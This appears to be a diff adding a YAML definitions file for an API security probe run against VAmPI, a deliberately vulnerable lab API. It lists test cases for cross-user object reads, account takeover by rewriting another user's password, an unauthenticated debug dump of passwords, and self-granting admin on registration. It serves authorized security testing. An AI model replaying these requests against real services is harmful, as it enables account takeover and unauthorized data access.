@@ -1,0 +1,155 @@
+# Machine-readable definitions for the cases written up in `cases/`.
+#
+# The playbook and the probe read from the same file on purpose. A playbook
+# that drifts from the tool that runs it is just a document with footnotes.
+#
+# Two case types:
+#
+#   access           One request, replayed as several identities. The case
+#                    declares who SHOULD get a 2xx. Anyone else who does is
+#                    the finding. This is the whole technique for BOLA and
+#                    BFLA: the bug is not in any single response, it is in
+#                    two identities getting the same one.
+#
+#   mass_assignment  Send a field the client has no business setting, then
+#                    read the object back and see whether it stuck. A 200 on
+#                    the write proves nothing; only the read-back does.
+
+target:
+  name: VAmPI
+  repo: https://github.com/erev0s/VAmPI
+  commit: f16052dce83f05847133ec98f01c5193a41de7d8
+  base_url: http://127.0.0.1:5000
+  # Reset to a known state before the run. VAmPI randomises book titles on
+  # seed, which is why titles are discovered below rather than hardcoded.
+  seed:
+    - { method: GET, path: /createdb }
+  login:
+    method: POST
+    path: /users/v1/login
+    body: { username: "$username", password: "$password" }
+    token_field: auth_token
+    header_name: Authorization
+    header_value: "Bearer {token}"
+
+identities:
+  - { id: owner, username: name1, password: pass1 }
+  - { id: other, username: name2, password: pass2 }
+  - { id: admin, username: admin, password: pass1 }
+  - { id: anon }
+
+# Values discovered from the live target, because they change every seed.
+variables:
+  owner_book:
+    request: { method: GET, path: /books/v1 }
+    list: Books
+    where: { user: name1 }
+    take: book_title
+  other_book:
+    request: { method: GET, path: /books/v1 }
+    list: Books
+    where: { user: name2 }
+    take: book_title
+
+cases:
+  - id: API1-BOLA-01
+    # Fixed by VAmPI's secure build (books.py:50 is gated on `vuln`).
+    fixed_in_secure_mode: true
+    type: access
+    title: Cross-user object read via a path parameter
+    owasp: "API1:2023 Broken Object Level Authorization"
+    cwe: "CWE-639"
+    severity: HIGH
+    request:
+      method: GET
+      path: "/books/v1/{other_book}"
+    # The book belongs to `other`. Nobody else should see it.
+    authorized: [other]
+    run_as: [owner, other, anon]
+
+  - id: API1-BOLA-02
+    # Fixed by the secure build (users.py:186 is gated on `vuln`), though it
+    # still answers 204. Only confirm_effect below tells the two apart.
+    fixed_in_secure_mode: true
+    type: access
+    title: Account takeover by rewriting another user's password
+    owasp: "API1:2023 Broken Object Level Authorization"
+    cwe: "CWE-639"
+    severity: CRITICAL
+    destructive: true
+    request:
+      method: PUT
+      path: "/users/v1/name2/password"
+      body: { password: "probe-set-this" }
+    authorized: [other]
+    run_as: [owner, other, anon]
+    # A 2xx here is not evidence. VAmPI's fixed build also returns 204 from
+    # this endpoint and updates the caller's own record instead of the path
+    # target, so status alone reports a violation against correct code.
+    # Confirm by logging in as the victim with the password we set.
+    #
+    # Matching on content, not status: VAmPI returns 200 on a failed login as
+    # well, so the status code carries no signal in the confirmation either.
+    confirm_effect:
+      request:
+        method: POST
+        path: /users/v1/login
+        body: { username: name2, password: "probe-set-this" }
+      expect_contains: auth_token
+
+  - id: API1-BOLA-03
+    # NOT gated upstream. get_by_username has no `vuln` branch, so this is
+    # broken in both builds.
+    fixed_in_secure_mode: false
+    type: access
+    title: Unauthenticated read of any user record
+    owasp: "API1:2023 Broken Object Level Authorization"
+    cwe: "CWE-639"
+    severity: MEDIUM
+    request:
+      method: GET
+      path: "/users/v1/name1"
+    # Only the record's owner has a claim to it.
+    authorized: [owner]
+    run_as: [owner, other, anon]
+
+  - id: API5-BFLA-01
+    # NOT gated upstream. The debug route has no auth check in either build.
+    fixed_in_secure_mode: false
+    type: access
+    title: Unauthenticated dump of every user record including passwords
+    owasp: "API5:2023 Broken Function Level Authorization"
+    cwe: "CWE-862"
+    severity: CRITICAL
+    request:
+      method: GET
+      path: "/users/v1/_debug"
+    # A debug dump is an administrative function at best.
+    authorized: [admin]
+    run_as: [owner, other, anon, admin]
+
+  - id: API3-MA-01
+    # Fixed by the secure build (users.py:60 is gated on `vuln`).
+    fixed_in_secure_mode: true
+    type: mass_assignment
+    title: Self-granted admin role on registration
+    owasp: "API3:2023 Broken Object Property Level Authorization"
+    cwe: "CWE-915"
+    severity: HIGH
+    request:
+      method: POST
+      path: /users/v1/register
+      body:
+        username: "probe-mallory"
+        password: "probe-mallory"
+        email: "probe-mallory@example.invalid"
+    # The field the client should not be able to set, and the value to try.
+    inject: { admin: true }
+    # Read the object back. A 200 on the write is not evidence.
+    verify:
+      request: { method: GET, path: /users/v1/_debug }
+      list: users
+      where: { username: "probe-mallory" }
+      take: admin
+    # If the read-back equals what we injected, the field was client-writable.
+    violation_when_equals: true
